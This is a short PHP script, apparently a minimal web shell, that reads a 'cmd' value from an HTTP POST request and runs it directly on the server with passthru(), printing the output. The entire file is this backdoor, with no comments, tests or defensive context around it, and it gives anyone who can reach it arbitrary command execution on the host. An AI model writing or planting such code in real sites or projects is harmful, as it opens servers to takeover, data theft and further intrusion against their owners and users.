<?php
function execute($com)
{
    echo passthru($com);
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
?>